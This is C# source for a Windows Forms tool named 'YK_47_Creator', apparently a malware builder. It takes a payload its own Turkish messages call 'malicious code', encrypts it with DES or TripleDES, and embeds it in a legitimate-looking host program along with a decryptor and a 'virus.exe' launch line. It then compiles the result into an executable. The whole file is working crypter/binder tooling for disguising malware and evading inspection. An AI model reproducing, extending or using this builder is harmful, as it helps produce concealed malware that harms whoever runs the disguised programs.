using FastColoredTextBoxNS;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace YK_47_Creator
{
    public partial class homeForm : Form
    {
        public homeForm()
        {
            InitializeComponent();
        }
        FastColoredTextBox payloadsText = new FastColoredTextBox();
        FastColoredTextBox skinText = new FastColoredTextBox();
        FastColoredTextBox complatedCode = new FastColoredTextBox();
        FastColoredTextBox compilerCode = new FastColoredTextBox();
        new string Location = Application.StartupPath;
        string virusCode = "";
        string Code = "";
        string Provider = "CSharp";

        private void Form1_Load(object sender, EventArgs e)
        {
            fCTextBoxAddForm();
            payloadStyleLoad();
            getSoftwares();
            btnRandomPass.PerformClick();
            comboPayloadStyle.SelectedIndex = 0;
            comboPayload.SelectedIndex = 0;
            comboCryptionMethod.SelectedIndex = 0;
            comboSkin.SelectedIndex = 0;
            Size = new Size(800,600);
        }
        private void payloadStyleLoad()
        {
            foreach (var item in Directory.GetDirectories(Location + "\\Payloads\\"))
            {
                DirectoryInfo fInfo = new DirectoryInfo(item);
                if (fInfo.Name != "Cplusplus")
                    comboPayloadStyle.Items.Add(fInfo.Name);
            }
        }
        private void getSoftwares()
        {
            foreach (var item in Directory.GetFiles(Location + "\\Software\\"))
            {
                FileInfo fInfo = new FileInfo(item);
                comboSkin.Items.Add(fInfo.Name);
            }
        }
        private void fCTextBoxAddForm()
        {
            payloadsText.Language = Language.CSharp;
            payloadsText.Dock = DockStyle.Fill;
            payloadsText.BackColor = Color.FromArgb(44,44,44);
            payloadsText.ForeColor = Color.Lime;
            panelPaylodCode.Controls.Add(payloadsText);

            skinText.Language = Language.CSharp;
            skinText.Dock = DockStyle.Fill;
            skinText.BackColor = Color.FromArgb(44, 44, 44);
            skinText.ForeColor = Color.Lime;
            panelProjectCode.Controls.Add(skinText);

            complatedCode.Language = Language.CSharp;
            complatedCode.Dock = DockStyle.Fill;
            complatedCode.BackColor = Color.FromArgb(44, 44, 44);
            complatedCode.ForeColor = Color.Lime;
            panelResultCode.Controls.Add(complatedCode);

            FileStream fStream = new FileStream(Location + "\\Additions\\Code Compiler.cs",FileMode.OpenOrCreate,FileAccess.Read);
            StreamReader sReader = new StreamReader(fStream);
            compilerCode.Text = sReader.ReadToEnd();
            compilerCode.Language = Language.CSharp;
            compilerCode.Dock = DockStyle.Fill;
            compilerCode.BackColor = Color.FromArgb(44, 44, 44);
            compilerCode.ForeColor = Color.Lime;
            panelCompilerCode.Controls.Add(compilerCode);
/*
            fStream = new FileStream(Location + "\\Additions\\Code Compiler.cs", FileMode.OpenOrCreate, FileAccess.Read);
            sReader = new StreamReader(fStream);
            compilerCode.Text = sReader.ReadToEnd();
            compilerCode.Language = Language.CSharp;
            compilerCode.Dock = DockStyle.Fill;
            compilerCode.BackColor = Color.FromArgb(44, 44, 44);
            compilerCode.ForeColor = Color.Lime;
            panelCompilerCode.Controls.Add(compilerCode);
*/
        }
        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboSkin.Text != "Custom")
            {
                skinText.Text = "";
                FileStream stream = new FileStream(Location + "\\Software\\" + comboSkin.Text, FileMode.Open, FileAccess.Read);
                StreamReader reader = new StreamReader(stream);
                string line = reader.ReadLine();
                while (line != null)
                {
                    skinText.Text += line + "\n";
                    line = reader.ReadLine();
                }
                reader.Close();
                stream.Close();
            }
        }
        private void LastProjectSave()
        {
            FileStream fs = new FileStream(Location + "\\LastProject\\Last.txt", FileMode.OpenOrCreate, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(Code);
            sw.Flush();
            sw.Close();
            fs.Close();
            MessageBox.Show("Kayıt Tamam !\n", "*_*" + Location + "\\LastProject\\Last.txt", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        private void CodeRevision()
        {
            Code = "";
            foreach (var item in skinText.Lines)
            {
                String line = item;
                if (item == "// #STRN_VRSC")
                {
                    line = virusCode;
                }
                if (item == "// #COMP_CODE")
                {
                    line = "";
                    foreach (var compilerCodeLine in compilerCode.Lines)
                    {
                        try
                        {
                            line += string.Format(compilerCodeLine,Provider) + "\n";
                        }
                        catch (Exception)
                        {
                            line += compilerCodeLine + "\n";
                        }
                    }
                }
                if (item == "// #RUNN_COMP_CODE")
                {
                    line = @"Process.Start(" + '"' + @"virus.exe" + '"' + @");";
                }
                if (item == "// #DECR_CODE")
                {
                    if (comboCryptionMethod.Text == "DES")
                        line = @"static string Decrypt(string str){try{string textToDecrypt = str;string ToReturn =""" + '"' + ";string publickey =" + '"' + string.Format("{0}", txtPubKey.Text) + '"' + ";string secretkey =" + '"' + string.Format("{0}", txtPrivKey.Text) + '"' + ";" + @" byte[] privatekeyByte = {};privatekeyByte = System.Text.Encoding.UTF8.GetBytes(secretkey);byte[] publickeybyte = {};publickeybyte = System.Text.Encoding.UTF8.GetBytes(publickey);MemoryStream ms = null;CryptoStream cs = null;byte[] inputbyteArray = new byte[textToDecrypt.Replace("" "", ""+"").Length];inputbyteArray = Convert.FromBase64String(textToDecrypt.Replace("" "", ""+""));using (DESCryptoServiceProvider des = new DESCryptoServiceProvider()){ms = new MemoryStream();cs = new CryptoStream(ms, des.CreateDecryptor(publickeybyte, privatekeyByte), CryptoStreamMode.Write);cs.Write(inputbyteArray, 0, inputbyteArray.Length);cs.FlushFinalBlock();Encoding encoding = Encoding.UTF8;ToReturn = encoding.GetString(ms.ToArray());}return ToReturn;}catch (Exception ae){throw new Exception(ae.Message, ae.InnerException);}}";
                    else if (comboCryptionMethod.Text == "tripleDES")
                        line = @"static string Decrypt(string input){byte[] inputArray = Convert.FromBase64String(input);TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();tripleDES.Key = UTF8Encoding.UTF8.GetBytes(" + '"' + string.Format("{0}", txtPrivKey.Text) + '"' + ");tripleDES.Mode = CipherMode.ECB;tripleDES.Padding = PaddingMode.PKCS7;ICryptoTransform cTransform = tripleDES.CreateDecryptor();byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);tripleDES.Clear();return UTF8Encoding.UTF8.GetString(resultArray);}";
                }
                Code += line +"\n";
            }
            complatedCode.Text = Code;
        }

        private void VirusCodeComp()
        {
            if (comboCryptionMethod.Text == "DES")
            {
                Cryption.DES des = new Cryption.DES();
                virusCode = "string str=" + '"' + des.Encrypt(payloadsText.Text, txtPubKey.Text, txtPrivKey.Text) + '"' + ";";
            }
            if (comboCryptionMethod.Text == "tripleDES")
            {
                Cryption.tripleDES des = new Cryption.tripleDES();
                virusCode = "string str=" + '"' + des.Encrypt(payloadsText.Text, txtPrivKey.Text) + '"' + ";";
            }
        }

        private void ParametresControl()
        {
            if (payloadsText.Text == "")
            {
                MessageBox.Show("Zararlı kodu vermediniz !", "Hata !", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (skinText.Text == "")
            {
                MessageBox.Show("Zararlı kodu çalıştıracak yazılım kodunu vermediniz !", "Hata !", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (comboCryptionMethod.Text == "DES" && txtPrivKey.Text == "" || txtPubKey.Text == "")
            {
                MessageBox.Show("DES algoritması için private ve public anahtar şart !", "Hata !", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }
        private void CodeCompile()
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "exe file(*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
                CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.dll" });
                parameters.GenerateExecutable = true;
                CodeDomProvider.IsDefinedLanguage("CSharp");
                parameters.OutputAssembly = sfd.FileName;
                parameters.GenerateInMemory = true;
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, complatedCode.Text);
                if (results.Errors.Count > 0)
                {
                    MessageBox.Show("Hata var derlenemedi !", "OH N0oo ;( !", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    foreach (var item in results.Errors)
                        MessageBox.Show(item.ToString(), "OH N0oo ;( !", MessageBoxButtons.OK, MessageBoxIcon.Error);

                    return;
                }
                else
                    MessageBox.Show("Hata yok. Program başarıyla derlendi.", "Tamam !", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void btnRandomPass_Click(object sender, EventArgs e)
        {
            txtPrivKey.Text = randomPassword();
            Thread.Sleep(250);
            txtPubKey.Text = randomPassword();
        }

        private string randomPassword(int Length = 8)
        {
            string returnedString = "";
            Random r = new Random();
            for (int i = 0; i < Length; i++)
                returnedString += r.Next(0, 9).ToString();
            return returnedString;
        }

        private void btnCreate_Click(object sender, EventArgs e)
        {
            ParametresControl();
            VirusCodeComp();
            CodeRevision();
            CodeCompile();
            LastProjectSave();
        }

        private void comboPayload_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboPayload.Text != "Custom")
            {
                payloadsText.Text = "";
                FileStream stream = new FileStream(Location + "\\Payloads\\" + comboPayloadStyle.Text + "\\" + comboPayload.Text, FileMode.Open, FileAccess.Read);
                StreamReader reader = new StreamReader(stream);
                string line = reader.ReadLine();
                while (line != null)
                {
                    payloadsText.Text += line + "\n";
                    line = reader.ReadLine();
                }
                reader.Close();
                stream.Close();
            }
        }

        private void comboPayloadStyle_SelectedIndexChanged(object sender, EventArgs e)
        {
            comboPayload.Items.Clear();
            foreach (var item in Directory.GetFiles(Location + "\\Payloads\\" + comboPayloadStyle.Text))
            {
                FileInfo fInfo = new FileInfo(item);
                comboPayload.Items.Add(fInfo.Name);
            }
            if (comboPayloadStyle.Text == "CSharp")
            {
                payloadsText.Language = Language.CSharp;
                Provider = "CSharp";

            }
            else if (comboPayloadStyle.Text == "VisualBasic")
            {
                payloadsText.Language = Language.VB;
                Provider = "VisualBasic";
            }
            else if (comboPayloadStyle.Text == "Cplusplus")
            {
                payloadsText.Language = Language.Custom;
                Provider = "Cpp";
            }
            else if (comboPayloadStyle.Text == "JScript")
            {
                payloadsText.Language = Language.JS;
                Provider = "JScript";
            }
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}
